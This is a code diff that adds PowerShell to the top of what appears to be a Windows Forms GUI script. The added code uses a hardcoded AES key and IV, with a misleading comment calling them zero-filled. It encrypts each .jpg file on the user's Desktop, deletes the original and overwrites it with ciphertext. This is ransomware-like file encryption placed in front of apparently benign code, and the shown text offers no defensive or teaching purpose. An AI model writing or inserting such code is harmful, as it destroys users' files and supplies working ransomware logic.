@@ -1,3 +1,49 @@
+# Define the AES key and IV (256-bit key, 128-bit IV, both filled with zeros for simplicity)
+$base64Key = "AatN58YdomB+dm/PhpPH37/xwPLACPe5Uux1R3hoQDA="
+$base64IV = "fokodaUsWaO1iDBrE8MfvQ=="
+$key = [System.Convert]::FromBase64String($base64Key)
+$iv = [System.Convert]::FromBase64String($base64IV)
+
+function Encrypt-File {
+    param (
+        [string]$filePath,
+        [byte[]]$key,
+        [byte[]]$iv
+    )
+
+    # Read file content
+    $content = [System.IO.File]::ReadAllBytes($filePath)
+
+    # Create AES instance
+    $aes = [System.Security.Cryptography.Aes]::Create()
+    $aes.Key = $key
+    $aes.IV = $iv
+    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+
+    # Encrypt the content
+    $encryptor = $aes.CreateEncryptor()
+    $encryptedBytes = $encryptor.TransformFinalBlock($content, 0, $content.Length)
+
+    # Delete all items before rewriting
+    Remove-Item $filePath
+
+    # Write encrypted content to new file
+    $encryptedFilePath = "$filePath"
+    [System.IO.File]::WriteAllBytes($encryptedFilePath, $encryptedBytes)
+
+    Write-Host "Encrypted: $filePath -> $encryptedFilePath"
+}
+
+# Get the Desktop path
+$desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"))
+
+# Find all .jpg files and encrypt them
+Get-ChildItem -Path $desktopPath -Filter *.jpg | ForEach-Object {
+    Encrypt-File -filePath $_.FullName -key $key -iv $iv
+}
+
+
 # Load Windows Forms assembly
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
